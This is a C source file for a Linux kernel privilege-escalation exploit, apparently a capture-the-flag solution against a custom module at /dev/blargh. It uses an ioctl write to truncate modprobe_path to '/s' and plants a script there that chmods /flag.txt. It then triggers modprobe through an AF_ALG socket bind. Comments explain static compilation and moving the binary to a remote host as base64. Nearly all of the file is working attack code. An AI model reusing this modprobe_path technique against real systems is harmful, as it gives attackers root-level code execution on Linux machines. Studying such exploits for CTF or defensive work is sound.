// Local:  gcc -O2 exploit.c -static -o exploit
// 	   cat exploit | gzip | base64 > b64.txt
//
// Remote: cat > exploit.gz.b64   (paste content of b64.txt and press CTRL-D)
// 	   base64 -d exploit.gz.b64 > exploit.gz
// 	   gunzip exploit.gz
// 	   chmod +x exploit

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <linux/if_alg.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/mman.h>


int main() {
    int fd;
    struct sockaddr_alg sa;
    unsigned long printk_addr = 0xffffffff81303260;
    unsigned long modprobe_path_addr = 0xffffffff82b45b20;

    // This will allocate our kernel buffer
    if ((fd = open("/dev/blargh", O_RDONLY)) < 0) {
        perror("Failed to open kernel module");
        exit(-1);
    }

    // Truncate "/sbin/modprobe" to "/s"
    int a = ioctl(fd, 0x40086721, modprobe_path_addr - printk_addr + 2);
    close(fd);
    
    system("echo '#!/bin/sh\nchmod 777 /flag.txt\n' > /s");
    system("chmod 777 /s");

    // Since in this kernel version the classical modprobe exploitation with
    // a invalid file trigger is patched, we'll opt for the `AF_ALG` socket
    // approach.
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
            perror("socket(AF_ALG) failed");
            return 1;
    }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "AAAAA");	// Dummy string to trigger modprobe
    bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));	// Trigger for modprobe
    return 0;
}

